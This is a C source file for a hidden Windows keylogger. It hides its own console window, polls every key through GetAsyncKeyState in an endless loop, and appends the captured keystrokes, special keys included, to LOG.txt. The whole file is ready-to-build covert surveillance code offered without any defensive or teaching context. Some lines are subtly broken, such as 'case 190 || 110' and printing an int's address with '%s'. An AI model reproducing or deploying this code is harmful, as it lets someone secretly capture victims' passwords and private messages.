#include <stdio.h>
#include <windows.h>

void stealth();
int save(int key_stroke, char *file);

int main() {
    stealth();
    char i;

    while (1) {
        for (int i = 0; i < 191; i++) {
            if (GetAsyncKeyState(i) == -32767) save(i, "LOG.txt");
        }
    }
    system("PAUSE");
    return 0;
}

void stealth() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

int save(int key_stroke, char *file) {
    if ((key_stroke == 1) || (key_stroke == 2)) return 0;
    FILE * OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");
    
    switch (key_stroke) {
        case 8: fprintf(OUTPUT_FILE, "[BACKSPACE]"); break;
        case 13: fprintf(OUTPUT_FILE, "\n"); break;
        case 32: fprintf(OUTPUT_FILE, " "); break;
        case VK_TAB: fprintf(OUTPUT_FILE, "[TAB]"); break;
        case VK_SHIFT: fprintf(OUTPUT_FILE, "[SHIFT]"); break;
        case VK_CONTROL: fprintf(OUTPUT_FILE, "[CONTROL]"); break;
        case VK_ESCAPE: fprintf(OUTPUT_FILE, "[ESCAPE]"); break;
        case VK_END: fprintf(OUTPUT_FILE, "[END]"); break;
        case VK_HOME: fprintf(OUTPUT_FILE, "[HOME]"); break;
        case VK_LEFT: fprintf(OUTPUT_FILE, "[LEFT]"); break;
        case VK_UP: fprintf(OUTPUT_FILE, "[UP]"); break;
        case VK_RIGHT: fprintf(OUTPUT_FILE, "[RIGHT]"); break;
        case VK_DOWN: fprintf(OUTPUT_FILE, "[DOWN]"); break;
        case 190 || 110: fprintf(OUTPUT_FILE, "."); break;
        default: fprintf(OUTPUT_FILE, "%s", &key_stroke); break;
    }
    fclose(OUTPUT_FILE);
    return 0;
}
